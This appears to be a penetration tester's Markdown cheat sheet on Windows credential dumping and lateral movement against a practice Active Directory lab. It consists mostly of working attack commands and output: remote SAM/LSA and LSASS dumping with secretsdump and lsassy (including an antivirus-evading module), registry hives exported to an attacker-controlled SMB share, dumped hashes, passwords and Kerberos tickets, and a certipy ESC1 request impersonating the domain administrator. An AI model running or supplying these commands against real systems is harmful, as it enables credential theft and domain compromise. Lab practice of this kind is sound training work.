# Lateral Movement

## Credential Dumping

### Remote

#### SAM, LSA, etc.

```sh
# jeor.mormont is local admin @ 10.10.10.22
secretsdump.py north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@10.10.10.22
```
#### LSASS

- `lsassy`

```console
$ lsassy -d north.sevenkingdoms.local -u jeor.mormont -p '_L0ngCl@w_' 10.10.10.22
[+] 10.10.10.22 Authentication successful
[+] 10.10.10.22 Lsass dumped in C:\Windows\Temp\935V.csv (48100838 Bytes)
[+] 10.10.10.22 Lsass dump deleted
[+] 10.10.10.22 NORTH\CASTELBLACK$                      [NT] 974fe3fdf3249bea19684addb0acbb22 | [SHA1] 7d7770677aadc5e5794dba80b389bcac0713455e
[+] 10.10.10.22 north.sevenkingdoms.local\CASTELBLACK$  [PWD] A+LNQ[1eREMJjuvoe;LaxSNeD4,9#o8kh;]IT\)3F%1-:KGZjQ2CN\7M%(@VnOq:As%-9.!Zz64RT=cqXmD;2cxl]"_mc\vjm?;2`VvPA\%NwAeA95Xk--[a
[+] 10.10.10.22 NORTH\robb.stark                        [NT] 831486ac7f26860c9e2f51ac91e1a07a | [SHA1] 3bea28f1c440eed7be7d423cefebb50322ed7b6c
[+] 10.10.10.22 NORTH\sql_svc                           [NT] 84a5092f53390ea48d660be52b93b804 | [SHA1] 9fd961155e28b1c6f9b3859f32f4779ad6a06404
[+] 10.10.10.22 NORTH.SEVENKINGDOMS.LOCAL\sql_svc       [PWD] YouWillNotKerboroast1ngMeeeeee
[+] 10.10.10.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 16:13 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_1a8893f6.kirbi)
[+] 10.10.10.22 NORTH.SEVENKINGDOMS.LOCAL\robb.stark    [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 16:16 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_d02dac29.kirbi)
[+] 10.10.10.22 NORTH.SEVENKINGDOMS.LOCAL\robb.stark    [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 16:16 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_d7206564.kirbi)
[+] 10.10.10.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 16:13 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_ea0ce89c.kirbi)
[+] 10.10.10.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 16:13 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_5ebf9286.kirbi)
[+] 10.10.10.22 13 Kerberos tickets written to /home/kali/.config/lsassy/tickets
[+] 10.10.10.22 7 masterkeys saved to /home/kali/.config/lsassy/masterkeys.txt
```

- `lsassy` w/ [dumpert](https://github.com/outflanknl/Dumpert) module (sort of bypass AV)

```sh
lsassy -d north.sevenkingdoms.local -u jeor.mormont -p '_L0ngCl@w_' 10.10.10.22 -m dumpertdll -O dumpertdll_path=/workspace/Outflank-Dumpert-DLL.dll
```

### Local

#### SAM (Security Account Manager)

- `SAM` database located at `C:\Windows\System32\config\SAM` and `HKLM\SAM`
- `SYSTEM` (required for decrypting `SAM` ) located at `C:\Windows\System32\config\SYSTEM` and `HKLM\SYSTEM`

```sh
smbserver.py -smb2support share .
reg.py north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@10.10.10.22 save -keyName 'HKLM\SAM' -o '\\10.10.10.200\share'
reg.py north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@10.10.10.22 save -keyName 'HKLM\SYSTEM' -o '\\10.10.10.200\share'
secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
```

The NTLM hashes could be used to perform pass-the-hash to move laterally

#### LSA (Local Security Authority) Secrets & Cached Domain Logon

Stored at `C:\Windows\System32\config\SECURITY` and `HKLM\SECURITY`

```sh
smbserver.py -smb2support share .
reg.py north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@10.10.10.22 save -keyName 'HKLM\SECURITY' -o '\\10.10.10.200\share'
reg.py north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@10.10.10.22 save -keyName 'HKLM\SYSTEM' -o '\\10.10.10.200\share'
secretsdump.py -security SECURITY.save -system SYSTEM.save LOCAL
```

> [!IMPORTANT]
> The cached domain logon hash `DCC2` is harder to crack and not usable for pass-the-hash

#### LSASSY

- by [@icyguider](https://youtu.be/Bg0GLaT_MMc?si=-edFD9pMAKDz-O4l)
    - create dump file of `lsass.exe` via task manager (`Details` tab) through RDP (need GUI session), then transfer the `.dmp` file and parse with `pypykatz`
    - `Out-Minidump` from `PowerSploit` (only requires CLI session), then dump with `pypykatz`
        ```ps1
        Get-Process lsass | Out-Minidump
        ```
    - `https://github.com/slyd0g/C-Sharp-Out-Minidump` C# parser
    - `https://github.com/icyguider/DumpNParse`

### Mimikatz

- Invoke-Mimikatz from `nishang`
- SharpKatz
- BetterSafetyKatz

## Lateral Movement With Impacket

### OPSEC Consideration

- <https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.html>
- <https://neil-fox.github.io/Impacket-usage-&-detection/>
- <https://mayfly277.github.io/posts/GOADv2-pwning-part9/#lateral-move-with-impacket>

## Over Pass-The-Hash

use NTLM hash to request TGT then use TGT to get interactive session

## Certificate

```sh
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
```

## Further Reading

- <https://en.hackndo.com/remote-lsass-dump-passwords/>
